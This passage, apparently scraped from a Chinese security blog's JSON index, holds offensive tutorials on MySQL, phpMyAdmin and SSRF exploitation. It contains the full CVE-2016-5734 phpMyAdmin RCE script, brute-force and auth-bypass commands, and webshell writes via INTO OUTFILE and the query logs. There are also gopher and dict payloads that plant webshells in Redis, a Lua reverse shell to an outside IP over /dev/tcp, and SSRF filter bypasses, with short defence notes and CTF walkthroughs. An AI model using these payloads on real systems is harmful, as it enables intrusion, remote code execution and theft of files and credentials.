\u0026hellip;其它利用命令可以去项目地址查看\n","date":"2025-06-14T19:35:57+08:00","image":"https://lserein.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/logo_hu_6434cd8d02c3ba6e.jpg","permalink":"https://lserein.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/","title":"数据库提权"},{"content":"Mysql弱口令 mysql服务默认配置只允许本地登录root用户\n1 port=\u0026#34;3306\u0026#34; 1.使用数据库账号密码爆破工具直接进行爆破，如Tscan\n2.使用MSF的数据库利用模块进行爆破\n1 2 3 4 5 6 7 8 9 10 msf6 \u0026gt; use auxiliary/scanner/mysql/mysql_login msf6 auxiliary(scanner/mysql/mysql_login) \u0026gt; set RHOSTS 192.168.1.145 RHOSTS =\u0026gt; 192.168.1.145 msf6 auxiliary(scanner/mysql/mysql_login) \u0026gt; set user_file user.txt user_file =\u0026gt; user.txt msf6 auxiliary(scanner/mysql/mysql_login) \u0026gt; set pass_file passwd.txt pass_file =\u0026gt; passwd.txt msf6 auxiliary(scanner/mysql/mysql_login) \u0026gt; set STOP_NO_SUCCESS true [!] Unknown datastore option: STOP_NO_SUCCESS. Did you mean STOP_ON_SUCCESS?STOP_NO_SUCCESS =\u0026gt; true msf6 auxiliary(scanner/mysql/mysql_login) \u0026gt; exploit Mysql 未授权访问（CVE-2012-2122） 安全科班大四学生渗透学习DAY1 身份绕过CVE-2012-2122-CSDN博客\n1 2 3 4 5 6 7 for i in `seq 1 1000`; do mysql -h 127.0.0.1 -P 3306 -uroot -p123 2\u0026gt;/dev/null done use auxiliary/scanner/mysql/mysql_authbypass_hashdump set rhost 127.0.0.1 exploit 将解出的密码拿去解密即可\nPhpMyadmin利用 1 inurl:phpmyadmin 【攻防实战】phpmyadmin-RCE集锦\nCVE-2016-5734 影响版本：phpMyAdmin 4.0.x—4.6.2\n访问phpmyadmin,并登录，密码和用户名都是root\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 #!/usr/bin/env python \u0026#34;\u0026#34;\u0026#34;cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7. CVE: CVE-2016-5734 Author: https://twitter.com/iamsecurity run: ./cve-2016-5734.py -u root --pwd=\u0026#34;\u0026#34; http://localhost/pma -c \u0026#34;system(\u0026#39;ls -lua\u0026#39;);\u0026#34; \u0026#34;\u0026#34;\u0026#34; import requests import argparse import sys __author__ = \u0026#34;@iamsecurity\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: parser = argparse.ArgumentParser() parser.add_argument(\u0026#34;url\u0026#34;, type=str, help=\u0026#34;URL with path to PMA\u0026#34;) parser.add_argument(\u0026#34;-c\u0026#34;, \u0026#34;--cmd\u0026#34;, type=str, help=\u0026#34;PHP command(s) to eval()\u0026#34;) parser.add_argument(\u0026#34;-u\u0026#34;, \u0026#34;--user\u0026#34;, required=True, type=str, help=\u0026#34;Valid PMA user\u0026#34;) parser.add_argument(\u0026#34;-p\u0026#34;, \u0026#34;--pwd\u0026#34;, required=True, type=str, help=\u0026#34;Password for valid PMA user\u0026#34;) parser.add_argument(\u0026#34;-d\u0026#34;, \u0026#34;--dbs\u0026#34;, type=str, help=\u0026#34;Existing database at a server\u0026#34;) parser.add_argument(\u0026#34;-T\u0026#34;, \u0026#34;--table\u0026#34;, type=str, help=\u0026#34;Custom table name for exploit.\u0026#34;) arguments = parser.parse_args() url_to_pma = arguments.url uname = arguments.user upass = arguments.pwd if arguments.dbs: db = arguments.dbs else: db = \u0026#34;test\u0026#34; token = False custom_table = False if arguments.table: custom_table = True table = arguments.table else: table = \u0026#34;prgpwn\u0026#34; if arguments.cmd: payload = arguments.cmd else: payload = \u0026#34;system(\u0026#39;uname -a\u0026#39;);\u0026#34; size = 32 s = requests.Session() # you can manually add proxy support it\u0026#39;s very simple ; # s.proxies = {\u0026#39;http\u0026#39;: \u0026#34;127.0.0.1:8080\u0026#34;, \u0026#39;https\u0026#39;: \u0026#34;127.0.0.1:8080\u0026#34;} s.verify = False sql = \u0026#39;\u0026#39;\u0026#39;CREATE TABLE `{0}` ( `first` varchar(10) CHARACTER SET utf8 NOT NULL ) ENGINE=InnoDB DEFAULT CHARSET=latin1; INSERT INTO `{0}` (`first`) VALUES (UNHEX(\u0026#39;302F6500\u0026#39;)); \u0026#39;\u0026#39;\u0026#39;.format(table) # get_token resp = s.post(url_to_pma + \u0026#34;/?lang=en\u0026#34;, dict( pma_username=uname, pma_password=upass )) if resp.status_code is 200: token_place = resp.text.find(\u0026#34;token=\u0026#34;) + 6 token = resp.text[token_place:token_place + 32] if token is False: print(\u0026#34;Cannot get valid authorization token.\u0026#34;) sys.exit(1) if custom_table is False: data = { \u0026#34;is_js_confirmed\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;db\u0026#34;: db, \u0026#34;token\u0026#34;: token, \u0026#34;pos\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;sql_query\u0026#34;: sql, \u0026#34;sql_delimiter\u0026#34;: \u0026#34;;\u0026#34;, \u0026#34;show_query\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;fk_checks\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;SQL\u0026#34;: \u0026#34;Go\u0026#34;, \u0026#34;ajax_request\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;ajax_page_request\u0026#34;: \u0026#34;true\u0026#34;, } resp = s.post(url_to_pma + \u0026#34;/import.php\u0026#34;, data, cookies=requests.utils.dict_from_cookiejar(s.cookies)) if resp.status_code == 200: if \u0026#34;success\u0026#34; in resp.json(): if resp.json()[\u0026#34;success\u0026#34;] is False: first = resp.json()[\u0026#34;error\u0026#34;][resp.json()[\u0026#34;error\u0026#34;].find(\u0026#34;\u0026lt;code\u0026gt;\u0026#34;)+6:] error = first[:first.find(\u0026#34;\u0026lt;/code\u0026gt;\u0026#34;)] if \u0026#34;already exists\u0026#34; in error: print(error) else: print(\u0026#34;ERROR: \u0026#34; + error) sys.exit(1) # build exploit exploit = { \u0026#34;db\u0026#34;: db, \u0026#34;table\u0026#34;: table, \u0026#34;token\u0026#34;: token, \u0026#34;goto\u0026#34;: \u0026#34;sql.php\u0026#34;, \u0026#34;find\u0026#34;: \u0026#34;0/e\\0\u0026#34;, \u0026#34;replaceWith\u0026#34;: payload, \u0026#34;columnIndex\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;useRegex\u0026#34;: \u0026#34;on\u0026#34;, \u0026#34;submit\u0026#34;: \u0026#34;Go\u0026#34;, \u0026#34;ajax_request\u0026#34;: \u0026#34;true\u0026#34; } resp = s.post( url_to_pma + \u0026#34;/tbl_find_replace.php\u0026#34;, exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies) ) if resp.status_code == 200: result = resp.json()[\u0026#34;message\u0026#34;][resp.json()[\u0026#34;message\u0026#34;].find(\u0026#34;\u0026lt;/a\u0026gt;\u0026#34;)+8:] if len(result): print(\u0026#34;result: \u0026#34; + result) sys.exit(0) print( \u0026#34;Exploit failed!\\n\u0026#34; \u0026#34;Try to manually set exploit parameters like --table, --database and --token.\\n\u0026#34; \u0026#34;Remember that servers with PHP version greater than 5.4.6\u0026#34; \u0026#34; is not exploitable, because of warning about null byte in regexp\u0026#34; ) sys.exit(1) 1 python .\\CVE-2016-5734.py -u root -p root http://192.168.165.41:8080/ -c \u0026#34;system(\u0026#39;cat /etc/passwd\u0026#39;)\u0026#34; CVE-2018-12613 phpmyadmin4.8.1任意文件读取漏洞\n1 http://192.168.0.108:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd 漏洞深度利用\n1 SELECT \u0026#39;\u0026lt;?php phpinfo()?\u0026gt;\u0026#39; //执行phpinfo命令 利用文件包含包含日志文件\n1 2 3 http://192.168.0.104:8080/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_5587bc62c8c09503e2882a8594d89ff7 //5587bc62c8c09503e2882a8594d89ff7 Cookie值 WooYun-2016-199433 phpmyadmin 2.x版本中存在一处反序列化漏洞，通过该漏洞，攻击者可以读取任意文件或执行任意代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 POST /scripts/setup.php HTTP/1.1 Host: 192.168.0.104:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Referer: http://192.168.0.104:8080/ Cookie: phpMyAdmin=5587bc62c8c09503e2882a8594d89ff7; pma_lang=zh_CN Upgrade-Insecure-Requests: 1 Priority: u=0, i Content-Type: application/x-www-form-urlencoded Content-Length: 80 action=test\u0026amp;configuration=O:10:\u0026#34;PMA_Config\u0026#34;:1:{s:6:\u0026#34;source\u0026#34;,s:11:\u0026#34;/etc/passwd\u0026#34;;} PhpMyadmin后台弱口令GetShell phpmyadmin页面getshell-腾讯云开发者社区-腾讯云\nselect into outfile直接写入 前提利用条件：\n对Web目录需要有写权限能够使用单引号（Root） 知道网站绝对路径（报错页面/Phpinfo/Php探针） secure_file_priv没有具体值 1 show global variables like \u0026#39;%secure%\u0026#39;; //查看secure_file_priv 关于secure_file_priv，****secure_file_priv 是用来限制 load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限\n1 2 3 当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权 当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权 secure_file_priv这个值是只读变量，只能通过配置文件修改。\n1 2 3 4 show variables like \u0026#34;%plugin%\u0026#34;; //查看mysql安装目录 //写入1句话木马 select \u0026#39;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#39; INTO OUTFILE \u0026#39;C:\\\\phpstudy\\\\phpstudy_pro\\\\WWW\\\\b.php\u0026#39; 利用全局日志写Shell 查看mysql的日志状态，默认是关闭的，因为这个日志的量非常大对资源是一个比较大的开销\n1 2 3 SHOW VARIABLES LIKE \u0026#39;%general%\u0026#39; general_log_file为日志保存的位置 开启general_log模式 开启general_log 的作用：开启它可以记录用户输入的每条命令，会把其保存在general_log_file的文件中，其实就是我们常说的****日志文件\n利用思路：开启general_log之后把general_log_file的值修改为该网站默认路径下的某一个自定义的php文件中，然后通过log日志进行写入一句话木马，然后再进一步利用 这里注意：在修改log路径前，源路径一定要提前记录下来，我们获取shell后还要恢复原来的路径\n1 2 3 4 5 6 set global general_log = on; //修改日志目录为shell地址 set global general_log_file=\u0026#39;C:\\\\phpstudy\\\\phpstudy_pro\\\\WWW\\\\webapp.php\u0026#39;; //在日志文件中写入Shell select \u0026#39;\u0026lt;?php eval($_POST[cmd]);?\u0026gt;\u0026#39; 慢查询Getshell 慢日志：一般都是通过long_query_time选项来设置这个时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值(默认为10秒)，这个查询语句将被记录到慢查询日志中。\n1 2 show global variables like \u0026#39;%long_query_time%\u0026#39; show global variables like \u0026#39;%long%\u0026#39; 1 2 查看慢日志参数 show global variables like \u0026#39;%slow%\u0026#39; 1 2 3 4 set global slow_query_log=1 # 打开慢日志 set global slow_query_log_file=\u0026#39;C:\\\\phpstudy\\\\phpstudy_pro\\\\WWW\\\\webbpp.php\u0026#39;\t# 慢日志的路径【注意：一定要用双反斜杠】 SELECT \u0026#39;\u0026lt;?php @eval($_POST[1]);?\u0026gt;\u0026#39; or sleep(11)\t# 这儿11是超过慢日志的10秒时间 SELECT \u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39; or sleep(11)\t","date":"2025-06-14T11:08:54+08:00","image":"https://lserein.github.io/p/mysql%E6%94%BB%E9%98%B2/mysql_hu_41fa5258407fda18.jpg","permalink":"https://lserein.github.io/p/mysql%E6%94%BB%E9%98%B2/","title":"Mysql攻防"},{"content":"外部表现：Dnslog平台可以接收到服务器的请求，但是不是存在这种现象就代表存在漏洞，是否存在漏洞取决于能否利用，如有道词典https://fanyi.youdao.com/#/TextTranslate\n是一种由攻击者构造形成由服务器端发起的请求的一个安全漏洞，URL可控\n1 2 3 4 5 6 7 8 9 10 轻则访问内网拓扑，网段，内网信息收集 高可getshell，文件读取 http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0223955 QQ空间SSRF漏洞 http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0215779 小米SSRF漏洞 http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0214331 华为SSRF漏洞 http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2016-0214261 有道SSRF漏洞绕过 1.http://10.100.21.7.xip.io 2.http://www.10.100.21.7.xip.name 3.http://t.im/14tjq 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php function curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); } $url = $_GET[\u0026#39;url\u0026#39;]; curl($url); ?\u0026gt; 对于SSRF类漏洞首先需要先尝试协议，看那种协议能够正常使用\n发现网站疑似存在SSRF漏洞先判断网站是否在云上，在云上可以尝试获取元数据\nSSRF半自动化挖掘 SSRF-King https://github.com/ethicalhackingplayground/ssrf-king\n直接扩展导入Jar包，在仪表盘中将扫描范围设置成如下图所示\nBurp扫描配置\u0026mdash;扫描设定里面\ncollaborator-everywhere bp开启拦截他会自动添加参数\nSSRF漏洞深度利用 注意：SSRF利用伪协议攻击内网IP时需要对数据进行URL二次编码，防止特殊个数数据影响执行和传输\nhttps://blog.csdn.net/csjjjd/article/details/140654737\n如果Dnslog地址能够成功获取到请求，表明服务器支持上述协议，如何判断SSRF是有回显SSRF还是无回显SSRF，只需要插入对应网站，查看网页能否正常加载\nhttp协议 1 2 3 4 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=http://mk1d.callback.red #探测内网192.168.10.1上3306端口，如果开放会有对应反馈 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=http://192.168.10.1:3306 如果想批量探测内网存活端口，只需要使用Burp的Intruder模块进行爆破\n1 2 3 4 5 6 7 8 9 GET /vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:3306 HTTP/1.1 Host: 111.229.71.77 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://111.229.71.77/vul/ssrf/ssrf_curl.php Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: close dict协议 字典服务器协议，访问字典资源。对传入的后缀文件有大小现限制。探测内网端口和服务一般使用http和dict协议，dict协议本身能够发送数据，dict协议扫描端口速度快\n1 2 3 4 5 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=dict://fc8k.callback.red http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:22 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=dict://ip:6739/info 使用dict探测端口是否开放，如果目标网站开放端口，会返回端口所提供的服务的部分组件信息\n如果目标端口关闭则不会产生任何提示\n写Webshell\n1 2 3 4 5 6 7 8 9 dict://192.168.0.100:6379/flushall //更新 dict://192.168.0.100:6379/config:set:dir:/var/www/html //设置webshell上传路径 dict://192.168.0.100:6379/config:set:dbfilename:webshell.php //设置写入文件 dict://192.168.0.100:6379/set:webshell:\u0026#34;123456\u0026#34; //设置写入内容，最后将内容进行编码，否则容易乱码 dict://192.168.0.100:6379/set:webshell:\u0026#34;十六进制一句话木马\u0026#34; dict://192.168.0.100:6379/save //保存 dict://192.168.0.100:6379/keys * //查看写入的文件 dict://192.168.0.100:6379/get webshell file协议 从文件中获取目标服务器的文件内容，不支持Dnslog回显\n1 2 3 4 5 6 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=file:///var/www/html/flag.php file:///etc/hosts #显示当前操作系统网卡的IP file:///proc/net/arp #显示arp缓存表(寻找内网其他主机) file:///proc/net/fib_trie #显示当前网段路由信息 Gopher协议 https://zhuanlan.zhihu.com/p/112055947 gopher协议详解\nhttps://github.com/tarunkant/Gopherus 工具项目地址\nhttps://github.com/firebroo/sec_tools/tree/master/redis-over-gopher 工具\nhttps://blog.csdn.net/weixin_39633252/article/details/113229123 ssrf攻击内网mysql\n分布式文档传递服务，可传入data\n1 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=gopher://mq9c.callback.red Gopher协议攻击内网Redis 方案1：写Webshell\n1 2 3 4 5 6 7 8 攻击前提：redis弱密码或无密码 知道网站根目录 目录有写入权限 python2 gopherus.py --exploit redis gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 生成后的payload最好在做一次url编码，从下划线开始 方案2：计划任务反弹shell\n方案3：写lua脚本getshell\nLua项目下SSRF利用Redis文件覆盖lua回显RCE\n1 2 ##LUA_START##os.execute(\u0026#34;/bin/bash -c \u0026#39;sh -i %26\u0026gt;/dev/tcp/120.24.186.57/1234 0\u0026gt;%261\u0026#39;\u0026#34;)##LUA_END## 那么可以通过gopher协议覆盖/scripts/visit.script⽂件，写⼊lua代码去反弹shell\n1 2 3 4 5 6 7 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D% 0A%241%0D%0A1%0D%0A%24101%0D%0A%0A%0A%23%23LUA_START%23%23os.execute%28%22/bin/bash%20 -c%20%27sh%20- i%20%26%3E/dev/tcp/120.24.186.57/1234%200%3E%261%27%22%29%23%23LUA_END%23%23%0A%0A%0D% 0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%248%0D%0A/scr ipts%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D% 0A%2412%0D%0Avisit.script%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A ldap协议 轻量级目录访问协议\n1 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=ldap://jndi.callback.red:5/in4y/ tftp协议 1 http://111.229.71.77/vul/ssrf/ssrf_curl.php?url=tftp://xxx.callback.red 绕过方法 https://mp.weixin.qq.com/s/p1ldAOlQ_gVB3w1bm0lQ7g\nSSRF漏洞特征在于请求包中存在url地址，这些特征会引起Waf/态势感知设备的告警\n1 2 3 #使用字符拼接进行绕过 http://192.168.0.102/ssrf.php?url=http://192.168.0.100.sslip.io:22 http://192.168.0.102/ssrf.php?url=http://hahahahhahahhah.la12.callback.red 环回地址绕过 1 2 3 4 5 6 7 环回地址绕过： http://[::1] http:/[::] http://[::]:8o/ http://g000::1:80/ http://127.1 http://0 进制绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /点分十进制 127.0.0.1 //八进制（也可以加点） 0177000000001 http://0000::1:80/ 0177.886.000.801 /十六进制 0x7F000001 0x7F.0x00.0x00.0x01 0x7F.00.00.01 /十进制 2130706433 //二进制 0b01111111000000000000000000000001 locathost 黑名单编码绕过 302重定向绕过 1 http://challenge-4d170753d38888ec.sandbox.ctfhub.com:10800/?url=http://www.baidu.com@0x7F.00.00.01/flag.php url参数滥用绕过（@/#） 1 2 # ---\u0026gt; url编码%23 ---\u0026gt;双url编码%2523 @ DNS重绑定 https://lock.cmpxchg8b.com/rebinder.html DNS重绑定在线网址\nhttps://zhuanlan.zhihu.com/p/89426041 浅谈DNS重绑定漏洞\nSSRF漏洞加固防御 1 2 3 将一些不用的协议禁止加入黑名单：dict,file,gopher,tftp... 内网IP设置白名单 端口IP限制，内网高危端口22，3306，6379限制 CTF中SSRF漏洞常规利用 https://www.ctfhub.com/#/skilltree CTF在线SSRF漏洞利用\nhttps://www.nssctf.cn/problem/2011\nhttps://www.cnblogs.com/lhqrusht0p/p/18017007\n填写需要curl的网站会直接跳转到网站首页，使用DNSlog进行探测，发现存在回显\n对网站进行伪协议攻击,发现可以使用file伪协议\n读取flag，提示存在ha1x1ux1u.php文件\n访问该文件，进行代码审计，还是个存在SSRF漏洞的代码\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); $file = $_GET[\u0026#34;file\u0026#34;]; if (stristr($file, \u0026#34;file\u0026#34;)){ die(\u0026#34;你败了.\u0026#34;); } //flag in /flag echo file_get_contents($file); [Hitcon 2017]SSRFme https://blog.csdn.net/qq_59471040/article/details/144250739\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;?php // 如果存在HTTP_X_FORWARDED_FOR头，则获取X-Forwarded-For头的内容 if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $http_x_headers = explode(\u0026#39;,\u0026#39;, $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]); // 将第一个IP地址设置为REMOTE_ADDR，这可能导致IP伪造 $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] = $http_x_headers[0]; } // 输出当前的REMOTE_ADDR，即用户的真实IP地址 echo $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]; // 根据用户IP和固定字符串创建一个目录名，并尝试创建这个目录 $sandbox = \u0026#34;sandbox/\u0026#34; . md5(\u0026#34;orange\u0026#34; . $_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]); @mkdir($sandbox); @chdir($sandbox); // 执行一个GET请求，获取用户指定URL的内容，并将其赋值给$data变量 // 这里存在一个命令注入的风险，因为$data变量直接用于shell_exec函数 $data = shell_exec(\u0026#34;GET \u0026#34; . escapeshellarg($_GET[\u0026#34;url\u0026#34;])); // 获取用户指定文件名的路径信息 $info = pathinfo($_GET[\u0026#34;filename\u0026#34;]); // 将路径中的点（.）替换为空，这可能是为了防止创建带有点的目录 $dir = str_replace(\u0026#34;.\u0026#34;, \u0026#34;\u0026#34;, basename($info[\u0026#34;dirname\u0026#34;])); // 创建目录并进入该目录 @mkdir($dir); @chdir($dir); // 将获取的数据保存为文件，文件名为用户指定的文件名 @file_put_contents(basename($info[\u0026#34;basename\u0026#34;]), $data); // 高亮显示当前文件的代码，这通常用于调试 highlight_file(__FILE__); ?\u0026gt; CTFHub\u0026mdash;POST请求\u0026mdash;考点gopher协议发送post请求 https://mp.weixin.qq.com/s/ElNAouUg0jpRhfgeE8zRkw\n题目描述：****这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年\n先尝试协议，看哪些协议能够支持，读取index.php文件\n读取flag.php文件\n使用gopher发送请求\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import urllib.parse payload =\\ \u0026#34;\u0026#34;\u0026#34;POST /flag.php HTTP/1.1 Host: 127.0.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 36 key=86a31efba632022b9e1883caa06858a9 \u0026#34;\u0026#34;\u0026#34; #注意后面一定要有回车，回车结尾表示http请求结束 tmp = urllib.parse.quote(payload) new = tmp.replace(\u0026#39;%0A\u0026#39;,\u0026#39;%0D%0A\u0026#39;) result = \u0026#39;gopher://127.0.0.1:80/\u0026#39;+\u0026#39;_\u0026#39;+new result = urllib.parse.quote(result) print(result) 这个生成的payload最好二次url编码一下\n1 2 3 4 5 6 7 8 9 GET /?url=gopher%3A//127.0.0.1%3A80/_%250D%250APOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D86a31efba632022b9e1883caa06858a9%2520%250D%250A HTTP/1.1 Host: challenge-c77475fa1b5a0319.sandbox.ctfhub.com:10800 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: close Upgrade-Insecure-Requests: 1 Priority: u=0, i CTFHub\u0026mdash;上传文件 https://mp.weixin.qq.com/s/d2r8JHUisxhhARLl3b-Yrg\n访问flag.php,上传文件抓取数据包，没用提交按钮，需要修改html代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 POST /flag.php HTTP/1.1 Host: challenge-69b96492ff78395b.sandbox.ctfhub.com:10800 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Content-Type: multipart/form-data; boundary=---------------------------199908452239551894662987264031 Content-Length: 350 Origin: http://challenge-69b96492ff78395b.sandbox.ctfhub.com:10800 Connection: close Referer: http://challenge-69b96492ff78395b.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php Upgrade-Insecure-Requests: 1 Priority: u=0, i -----------------------------199908452239551894662987264031 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;\u0026#34; Content-Type: application/octet-stream -----------------------------199908452239551894662987264031 Content-Disposition: form-data; name=\u0026#34;submit\u0026#34; 提交查询 -----------------------------199908452239551894662987264031-- 将代码使用python脚本生成payload\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import urllib.parse payload =\\ \u0026#34;\u0026#34;\u0026#34;POST /flag.php HTTP/1.1 Host: challenge-69b96492ff78395b.sandbox.ctfhub.com:10800 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Content-Type: multipart/form-data; boundary=---------------------------199908452239551894662987264031 Content-Length: 350 Origin: http://challenge-69b96492ff78395b.sandbox.ctfhub.com:10800 Connection: close Referer: http://challenge-69b96492ff78395b.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php Upgrade-Insecure-Requests: 1 Priority: u=0, i -----------------------------199908452239551894662987264031 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;\u0026#34; Content-Type: application/octet-stream -----------------------------199908452239551894662987264031 Content-Disposition: form-data; name=\u0026#34;submit\u0026#34; 提交查询 -----------------------------199908452239551894662987264031-- \u0026#34;\u0026#34;\u0026#34; #注意后面一定要有回车，回车结尾表示http请求结束 tmp = urllib.parse.quote(payload) new = tmp.replace(\u0026#39;%0A\u0026#39;,\u0026#39;%0D%0A\u0026#39;) result = \u0026#39;gopher://127.0.0.1:80/\u0026#39;+\u0026#39;_\u0026#39;+new result = urllib.parse.quote(result) print(result) 1 2 3 4 5 6 7 8 9 GET 